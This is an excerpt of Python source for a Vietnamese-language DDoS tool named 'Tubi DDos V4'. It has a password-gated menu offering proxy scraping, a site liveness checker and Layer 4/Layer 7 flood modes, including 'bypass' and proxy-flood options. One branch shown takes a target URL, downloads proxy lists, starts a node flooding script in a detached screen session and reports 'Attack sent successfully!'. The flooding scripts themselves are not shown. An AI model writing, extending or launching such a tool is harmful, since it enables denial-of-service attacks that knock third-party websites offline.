...
def login():
    ...
    password = getpass.getpass(prompt='⚡ Mật Khẩu (Đã bảo mật = Vô Hình): ')
    if username != user or password != passwd:
        print("")
        print("⚡ Lỗi, Vui Lòng Điền Đúng MK...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to TUBIDDoS!")
        time.sleep(0.3)
...
░ ▓██▓ ░ ▓▓█  ░██░▒██░█▀  ░██░
  ...
  ░       ░░░ ░ ░  ░    ░  ▒ ░
            ░      ░       ░  
                        ░   
''')
		print(Color.LC+"    Gõ "+Color.LB+"'HELP'"+Color.LC+" Để Thấy Full Lệnh\n\n")
		print(Color.LR+'['+Color.LG+'01'+Color.LR+']'+Color.LC+' Proxy (lấy proxy mới nhất)')
		print(Color.LR+'['+Color.LG+'02'+Color.LR+']'+Color.LC+' WebTool (check die/live web)')
		print(Color.LR+'['+Color.LG+'03'+Color.LR+']'+Color.LC+' L4/L7 DDoS')
		print(Color.LR+'['+Color.LG+'04'+Color.LR+']'+Color.LC+' SpeedTest Mạng')
		print('\n')
		while True:
			try:
				sys.stdout.write(Color.LB+'╔═══'+Color.LR+'['+Color.LR+'Tubi-DDos'+Color.LB+'@'+Color.LG+'Home'+Color.LR+']'+Color.LB+'\n╚══> '+Color.RESET)
				option = input()
				if option == '01' or option == '1':
					...
					subprocess.run(['pkill -f t.py'], shell=True)
				elif option == 'stop' or option == 'STOP':
					subprocess.run(['pkill screen'], shell=True)
					print(f'{Color.LG} [!] Đã Dừng Tấn Công!')
				elif option == '':
					pass
				else:
					print(Color.LR+'command: '+Color.LG+f'{option}'+Color.LR+' Không Hợp Lệ')
...
class Tool:
	...
	def proxy(self, new):
		...
		if new == 'ref' or new == 'REF' or new == 'clear' or new == 'CLEAR':
			os.system('clear')
			t.styleText('[*] Downloading New Proxy...')
		else:
			t.styleText('[*] Downloading All Proxy...')
		try:
...
''')
		...
		print('\n')
		while True:
				sys.stdout.write(Color.LB+'╔═══'+Color.LR+'['+Color.LR+'Tubi-DDos'+Color.LB+'@'+Color.LG+'Proxy'+Color.LR+']'+Color.LB+'\n╚══> '+Color.RESET)
				option = input()
				if option == '01' or option == '1':
...
''')
		...
		print('\n')
		while True:
			sys.stdout.write(Color.LB+'╔═══'+Color.LR+'['+Color.LR+'Tubi-DDos'+Color.LB+'@'+Color.LG+'Webtool'+Color.LR+']'+Color.LB+'\n╚══> '+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				while True:
...
''')
	...
	def bbos(self):
		...
		print('\n')
		while True:
			sys.stdout.write(Color.LB+'╔═══'+Color.LR+'['+Color.LR+'Tubi-DDos'+Color.LB+'@'+Color.LG+'L4/L7/BBoS'+Color.LR+']'+Color.LB+'\n╚══> '+Color.RESET)
			option = input()
			if option == '01' or option == '1':
...
''')
		...
		print('\n')
		while True:
			sys.stdout.write(Color.LB+'╔═══'+Color.LR+'['+Color.LR+'Tubi-DDos'+Color.LB+'@'+Color.LG+'Layer4'+Color.LR+']'+Color.LB+'\n╚══> '+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
...
''')
		print(f'''{Color.LR} [01] DDoS ByPass ''')
		print(f'''{Color.LR} [02] Dạng Http/https ''')
		print(f'''{Color.LR} [03] Dạng Https ''')
		print(f'''{Color.LR} [04] Dạng Socket \n [05] Dạng Dồn Proxy cực bá (tubi)''')
		print(f'''{Color.LR} [00] Trở Về''')
		print('\n')
		...
		while True:
			sys.stdout.write(Color.LB+'╔═══'+Color.LR+'['+Color.LR+'Tubi-DDos'+Color.LB+'@'+Color.LG+'Layer7'+Color.LR+']'+Color.LB+'\n╚══> '+Color.RESET)
			option = input()
			if option == '01' or option == '1':
				try:
				...
				try:
					url = str(input(f'{Color.LG} [>] URL: '+Color.RESET))
					time = int(input(f'{Color.LG} [>] Thread: '+Color.RESET))
					t.styleText('\n [*] Đang Tấn Công...\n')
					with open('utils/http.txt', 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node utils/L7/tubi {url} {time} 25 tuancute'], shell=True)
					print(Color.LG+f'\n [!] Attack sent successfully!\n')
				except:
					print(f'{Color.LR}ERROR: {Color.RESET}Try again')
			elif option == 'ref' or option == 'REF':
...
def main():
	...
	t.styleText('[+] Đang Vào Tubi DDos V4...\n\n')
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			t.styleText(f'[!] {pkg} is not installed!\n')
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\n[?] Error? vui lòng sử dụng:{Color.LG} sh install.sh')
	else:pass
	try:
		script = True
...
{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev'''
	dev = f'''{Color.LC}Facebook:{Color.LR}: {Color.LY}fb.com/tubi2022
{Color.LC}Discord{Color.LR}: {Color.LY}phananhtuan#6020'''
	t = Home(commands, dev)
